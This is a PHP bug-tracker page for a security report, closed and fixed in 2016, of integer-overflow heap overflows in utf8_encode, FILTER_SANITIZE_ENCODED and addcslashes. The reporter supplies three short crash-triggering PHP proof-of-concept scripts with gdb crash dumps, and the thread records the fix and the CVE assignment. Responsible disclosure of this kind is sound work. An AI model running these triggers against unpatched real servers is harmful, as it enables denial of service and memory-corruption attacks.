<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #71637 - RDF' href='rss/bug.php?id=71637'>
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #71637 - RSS 2.0' href='rss/bug.php?id=71637&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #71637 :: Multiple Heap Overflow due to integer overflows | xml/filter_url/addcslashes</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=71637">Sec Bug</a>&nbsp;#71637</th>
            <td id="summary" colspan="5">Multiple Heap Overflow due to integer overflows | xml/filter_url/addcslashes</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-02-20 12:21 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-04-28 17:02 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=%2AGeneral+Issues">*General Issues</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>7.0.3</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4344" target="_blank">2016-4344</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=71637&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=71637&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=71637&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1455970871">&nbsp;</a><strong>[2016-02-20 12:21 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
<pre class='note'>Description:
------------
When I searched the string &quot;zend_string_alloc&quot; and look at those length, i found some integer-overflow issues which leading to heap overflow.

I've attached 03 various crash report below.

All of them are tested on PHP7.0.3-32bit.

* Fix:
- We should use safe string allocation method.



Test script:
---------------
&lt;?php
//1.php
ini_set('memory_limit',-1);
utf8_encode(str_repeat(&quot;A&quot;,(0xffffffff/4)+0x1000));
?&gt;

&lt;?php
//2.php
ini_set('memory_limit',-1);
$a = str_repeat('@',0xffffffff/3 + 10);
filter_var($a, FILTER_SANITIZE_ENCODED); 
?&gt;

&lt;?php
//3.php
ini_set('memory_limit',-1);
addcslashes(str_repeat('A',0xffffffff/4 + 0x1337),'/');
?&gt;

Expected result:
----------------
root@ubuntu:~/php/poc/heapoverflow_string# /root/php/32bit/php-7.0.3/sapi/cli/php 1.php
Segmentation fault (core dumped)
root@ubuntu:~/php/poc/heapoverflow_string# USE_ZEND_ALLOC=0 /root/php/32bit/php-7.0.3/sapi/cli/php 2.php
Segmentation fault (core dumped)
root@ubuntu:~/php/poc/heapoverflow_string# /root/php/32bit/php-7.0.3/sapi/cli/php 3.php
Segmentation fault (core dumped)
root@ubuntu:~/php/poc/heapoverflow_string# 

Actual result:
--------------
gdb-peda$ r /root/php/poc/heapoverflow_string/1.php 
Starting program: /root/php/32bit/php-7.0.3/sapi/cli/php /root/php/poc/heapoverflow_string/1.php

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x194ff0 
EBX: 0x0 
ECX: 0x41 ('A')
EDX: 0xf5e6b000 --&gt; 0x1 
ESI: 0xf5e14020 --&gt; 0xf5e74118 ('A' &lt;repeats 200 times&gt;...)
EDI: 0xf5e74118 ('A' &lt;repeats 200 times&gt;...)
EBP: 0xffff9f78 --&gt; 0xffff9fb8 --&gt; 0xffffa038 --&gt; 0xffffa058 --&gt; 0xffffa138 --&gt; 0xffffa168 --&gt; 0xffffc318 --&gt; 0xffffd598 --&gt; 0xffffd6b8 --&gt; 0x0 
ESP: 0xffff9ef0 --&gt; 0x41 ('A')
EIP: 0x8453939 (&lt;xml_utf8_encode+478&gt;:  mov    BYTE PTR [edx+eax*1+0x10],cl)
EFLAGS: 0x10293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8453931 &lt;xml_utf8_encode+470&gt;:     mov    edx,DWORD PTR [ebp-0x60]
   0x8453934 &lt;xml_utf8_encode+473&gt;:     mov    ecx,edx
   0x8453936 &lt;xml_utf8_encode+475&gt;:     mov    edx,DWORD PTR [ebp-0x64]
=&gt; 0x8453939 &lt;xml_utf8_encode+478&gt;:     mov    BYTE PTR [edx+eax*1+0x10],cl
   0x845393d &lt;xml_utf8_encode+482&gt;:     jmp    0x8453a94 &lt;xml_utf8_encode+825&gt;
   0x8453942 &lt;xml_utf8_encode+487&gt;:     cmp    DWORD PTR [ebp-0x60],0x7ff
   0x8453949 &lt;xml_utf8_encode+494&gt;:     ja     0x8453992 &lt;xml_utf8_encode+567&gt;
   0x845394b &lt;xml_utf8_encode+496&gt;:     mov    eax,DWORD PTR [ebp-0x64]
[------------------------------------stack-------------------------------------]
0000| 0xffff9ef0 --&gt; 0x41 ('A')
0004| 0xffff9ef4 --&gt; 0xf5e14100 --&gt; 0xfff00000 
0008| 0xffff9ef8 --&gt; 0x18 
0012| 0xffff9efc --&gt; 0x8a8da40 --&gt; 0x0 
0016| 0xffff9f00 --&gt; 0x1 
0020| 0xffff9f04 --&gt; 0x1 
0024| 0xffff9f08 --&gt; 0x3fe6c00f 
0028| 0xffff9f0c --&gt; 0x84536ae (&lt;xml_encode_iso_8859_1&gt;:        push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x08453939 in xml_utf8_encode (s=0xb5b95000 'A' &lt;repeats 200 times&gt;..., len=0x40000fff, encoding=0x8a8d5ba &quot;ISO-8859-1&quot;) at /root/php/32bit/php-7.0.3/ext/xml/xml.c:589
589                             ZSTR_VAL(str)[ZSTR_LEN(str)++] = (char) c;
gdb-peda$ 




///////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////


gdb-peda$ set environment USE_ZEND_ALLOC=0
gdb-peda$ r /root/php/poc/heapoverflow_string/2.php 
Starting program: /root/php/32bit/php-7.0.3/sapi/cli/php /root/php/poc/heapoverflow_string/2.php

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x20ba0 
EDX: 0x0 
ESI: 0xf5e18028 --&gt; 0x8c78b80 --&gt; 0x8562bd8 (&lt;ZEND_DO_ICALL_SPEC_HANDLER&gt;:      push   ebp)
EDI: 0x8c78b80 --&gt; 0x8562bd8 (&lt;ZEND_DO_ICALL_SPEC_HANDLER&gt;:     push   ebp)
EBP: 0xffff9f48 --&gt; 0xffff9f98 --&gt; 0xffffa018 --&gt; 0xffffa038 --&gt; 0xffffa118 --&gt; 0xffffa148 --&gt; 0xffffc2f8 --&gt; 0xffffd578 --&gt; 0xffffd698 --&gt; 0x0 
ESP: 0xffff9ef0 --&gt; 0xf5e18028 --&gt; 0x8c78b80 --&gt; 0x8562bd8 (&lt;ZEND_DO_ICALL_SPEC_HANDLER&gt;:       push   ebp)
EIP: 0x84ec6bb (&lt;_zval_copy_ctor_func+249&gt;:     mov    DWORD PTR [eax],0x1)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x84ec6b0 &lt;_zval_copy_ctor_func+238&gt;:        call   0x84bbdf4 &lt;_emalloc&gt;
   0x84ec6b5 &lt;_zval_copy_ctor_func+243&gt;:        mov    DWORD PTR [ebp-0x18],eax
   0x84ec6b8 &lt;_zval_copy_ctor_func+246&gt;:        mov    eax,DWORD PTR [ebp-0x18]
=&gt; 0x84ec6bb &lt;_zval_copy_ctor_func+249&gt;:        mov    DWORD PTR [eax],0x1
   0x84ec6c1 &lt;_zval_copy_ctor_func+255&gt;:        cmp    DWORD PTR [ebp-0x1c],0x0
   0x84ec6c5 &lt;_zval_copy_ctor_func+259&gt;:        je     0x84ec6ce &lt;_zval_copy_ctor_func+268&gt;
   0x84ec6c7 &lt;_zval_copy_ctor_func+261&gt;:        mov    eax,0x106
   0x84ec6cc &lt;_zval_copy_ctor_func+266&gt;:        jmp    0x84ec6d3 &lt;_zval_copy_ctor_func+273&gt;
[------------------------------------stack-------------------------------------]
0000| 0xffff9ef0 --&gt; 0xf5e18028 --&gt; 0x8c78b80 --&gt; 0x8562bd8 (&lt;ZEND_DO_ICALL_SPEC_HANDLER&gt;:      push   ebp)
0004| 0xffff9ef4 --&gt; 0xf5e180e8 --&gt; 0x202 
0008| 0xffff9ef8 --&gt; 0x1 
0012| 0xffff9efc --&gt; 0xf5e18098 --&gt; 0x4b36c008 --&gt; 0x1 
0016| 0xffff9f00 --&gt; 0x14 
0020| 0xffff9f04 --&gt; 0x1 
0024| 0xffff9f08 --&gt; 0xf5e18098 --&gt; 0x4b36c008 --&gt; 0x1 
0028| 0xffff9f0c --&gt; 0xf5e18098 --&gt; 0x4b36c008 --&gt; 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x084ec6bb in zend_string_alloc (persistent=0x0, len=0x5555555f) at /root/php/32bit/php-7.0.3/Zend/zend_string.h:123
123             GC_REFCOUNT(ret) = 1;
gdb-peda$ 






///////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////




gdb-peda$ r /root/php/poc/heapoverflow_string/3.php 
Starting program: /root/php/32bit/php-7.0.3/sapi/cli/php /root/php/poc/heapoverflow_string/3.php

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xf6000000 
EBX: 0x0 
ECX: 0x7c ('|')
EDX: 0x41 ('A')
ESI: 0xf5e14020 --&gt; 0xf5e74134 ('A' &lt;repeats 200 times&gt;...)
EDI: 0xf5e74134 ('A' &lt;repeats 200 times&gt;...)
EBP: 0xffff9f58 --&gt; 0xffff9fb8 --&gt; 0xffffa038 --&gt; 0xffffa058 --&gt; 0xffffa138 --&gt; 0xffffa168 --&gt; 0xffffc318 --&gt; 0xffffd598 --&gt; 0xffffd6b8 --&gt; 0x0 
ESP: 0xffff9dd0 --&gt; 0xf5e552f9 --&gt; 0x0 
EIP: 0x840848e (&lt;php_addcslashes+651&gt;:  mov    BYTE PTR [eax],dl)
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x840847e &lt;php_addcslashes+635&gt;:     lea    edx,[eax+0x1]
   0x8408481 &lt;php_addcslashes+638&gt;:     mov    DWORD PTR [ebp-0x154],edx
   0x8408487 &lt;php_addcslashes+644&gt;:     movzx  edx,BYTE PTR [ebp-0x159]
=&gt; 0x840848e &lt;php_addcslashes+651&gt;:     mov    BYTE PTR [eax],dl
   0x8408490 &lt;php_addcslashes+653&gt;:     add    DWORD PTR [ebp-0x158],0x1
   0x8408497 &lt;php_addcslashes+660&gt;:     mov    eax,DWORD PTR [ebp-0x158]
   0x840849d &lt;php_addcslashes+666&gt;:     cmp    eax,DWORD PTR [ebp-0x14c]
   0x84084a3 &lt;php_addcslashes+672&gt;:     jb     0x8408335 &lt;php_addcslashes+306&gt;
[------------------------------------stack-------------------------------------]
0000| 0xffff9dd0 --&gt; 0xf5e552f9 --&gt; 0x0 
0004| 0xffff9dd4 --&gt; 0x1 
0008| 0xffff9dd8 --&gt; 0xffff9e4c --&gt; 0x0 
0012| 0xffff9ddc --&gt; 0x84b547f (&lt;zend_mm_chunk_alloc_int+260&gt;:  mov    eax,DWORD PTR [ebp-0x10])
0016| 0xffff9de0 --&gt; 0xf5e69040 --&gt; 0xb5a00000 --&gt; 0x1 
0020| 0xffff9de4 --&gt; 0xf5e00040 --&gt; 0x0 
0024| 0xffff9de8 --&gt; 0xf5e552f8 --&gt; 0x2f ('/')
0028| 0xffff9dec --&gt; 0xb5a00000 --&gt; 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0840848e in php_addcslashes (str=0xb5a00000, should_free=0x0, what=0xf5e552f8 &quot;/&quot;, wlength=0x1) at /root/php/32bit/php-7.0.3/ext/standard/string.c:3845
3845                    *target++ = c;
gdb-peda$ 

</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=71637'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=71637'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1456102588">&nbsp;</a><strong>[2016-02-22 00:56 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Open</span>
<span class="added">+Status: Feedback</span>
</div></div></div><div class='comment type_comment' ><a name="1456102588">&nbsp;</a><strong>[2016-02-22 00:56 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Could you please explain why you think that any of those are security issues?
</pre>
</div><div class='comment type_log' ><a name="1456122497">&nbsp;</a><strong>[2016-02-22 06:28 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Feedback</span>
<span class="added">+Status: Open</span>
</div></div></div><div class='comment type_comment' ><a name="1456122497">&nbsp;</a><strong>[2016-02-22 06:28 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
<pre class='note'>Basically, it is related to <a href="https://bugs.php.net/bug.php?id=71270" rel="nofollow">https://bugs.php.net/bug.php?id=71270</a>

They are on same issues.

When sizeof allocated places is less than the its input.

You can see crash reports, it tried to over-write the next block and so on.

If #71270 was considered to be security issues, then i think these issues should be also.

*********************** SNIP ***********************

PHP_XML_API zend_string *xml_utf8_encode(const char *s, size_t len, const XML_Char *encoding)
{
...
	str = zend_string_alloc(len * 4, 0);
...

...
PHPAPI zend_string *php_addcslashes(zend_string *str, int should_free, char *what, size_t wlength)
{
	char flags[256];
	char *source, *target;
	char *end;
	char c;
	size_t  newlen;
	zend_string *new_str = zend_string_alloc(4 * ZSTR_LEN(str), 0);
...



static void php_filter_encode_url(zval *value, const unsigned char* chars, const int char_len, int high, int low, int encode_nul)
{
...
	str = zend_string_alloc(3 * Z_STRLEN_P(value), 0);

*********************** SNIP ***********************
</pre>
</div><div class='comment type_log' ><a name="1456125486">&nbsp;</a><strong>[2016-02-22 07:18 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1456125486">&nbsp;</a><strong>[2016-02-22 07:18 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Fix added to security repo as 57b997ebf99e0eb9a073e0dafd2ab100bd4a112d and to <a href="https://gist.github.com/smalyshev/06070802c576df949aab" rel="nofollow">https://gist.github.com/smalyshev/06070802c576df949aab</a>, Please verify.
</pre>
</div><div class='comment type_comment' ><a name="1456126423">&nbsp;</a><strong>[2016-02-22 07:33 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
<pre class='note'>well issues is fixed

since safe allocation method is used, exception will occur if integer-overflow happens.
</pre>
</div><div class='comment type_svn' ><a name="1456902762">&nbsp;</a><strong>[2016-03-02 07:12 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=9cabc99fcef0f12b472e40811beab4eb2ef17e1b" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=9cabc99fcef0f12b472e40811beab4eb2ef17e1b</a>
Log: Fix <a href='bug.php?id=71637'>bug #71637</a>: Multiple Heap Overflow due to integer overflows
</pre>
</div><div class='comment type_log' ><a name="1456902763">&nbsp;</a><strong>[2016-03-02 07:12 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1456902765">&nbsp;</a><strong>[2016-03-02 07:12 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=57b997ebf99e0eb9a073e0dafd2ab100bd4a112d" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=57b997ebf99e0eb9a073e0dafd2ab100bd4a112d</a>
Log: Fix <a href='bug.php?id=71637'>bug #71637</a>: Multiple Heap Overflow due to integer overflows
</pre>
</div><div class='comment type_log' ><a name="1461862814">&nbsp;</a><strong>[2016-04-28 17:00 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2016-4344</span>
</div></div></div><div class='comment type_comment' ><a name="1461862957">&nbsp;</a><strong>[2016-04-28 17:02 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<pre class='note'>CVE-2016-4344: ext/xml/xml.c
CVE-2016-4345: ext/filter/sanitizing_filters.c
CVE-2016-4346: ext/standard/string.c
</pre>
</div><div class='comment type_svn' ><a name="1469014394">&nbsp;</a><strong>[2016-07-20 11:33 UTC] <a href="//people.php.net/davey">davey@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=9cabc99fcef0f12b472e40811beab4eb2ef17e1b" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=9cabc99fcef0f12b472e40811beab4eb2ef17e1b</a>
Log: Fix <a href='bug.php?id=71637'>bug #71637</a>: Multiple Heap Overflow due to integer overflows
</pre>
</div><div class='comment type_svn' ><a name="1469014400">&nbsp;</a><strong>[2016-07-20 11:33 UTC] <a href="//people.php.net/davey">davey@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=57b997ebf99e0eb9a073e0dafd2ab100bd4a112d" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=57b997ebf99e0eb9a073e0dafd2ab100bd4a112d</a>
Log: Fix <a href='bug.php?id=71637'>bug #71637</a>: Multiple Heap Overflow due to integer overflows
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
